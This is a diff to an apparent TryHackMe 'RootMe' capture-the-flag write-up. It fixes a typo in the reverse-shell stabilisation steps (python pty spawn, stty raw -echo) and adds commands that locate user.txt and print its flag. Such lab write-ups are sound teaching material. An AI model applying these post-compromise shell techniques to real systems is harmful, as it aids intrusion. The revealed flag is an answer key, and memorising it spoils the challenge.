@@ -126,9 +126,31 @@ www-data
 $ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@rootme:/$ fg
 www-data@rootme:/$ stty raw -echo
-stty raw -echofg
+stty raw -echo
 www-data@rootme:/$ fg
 bash: fg: current: no such job
 www-data@rootme:/$ export TERM=xterm
 www-data@rootme:/$
+```
+
+- Then search for the file user.txt below:
+
+```
+www-data@rootme:/$ find / -type f -name user.txt
+/var/www/user.txt
+
+```
+
+- user.txt is located at /var/www/
+- try to cat /var/www/user.txt to get the first flag:
+
+```
+www-data@rootme:/$ cat /var/www/user.txt
+THM{y0u_g0t_a_sh3ll}
+www-data@rootme:/$ ^C
+                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
 ```
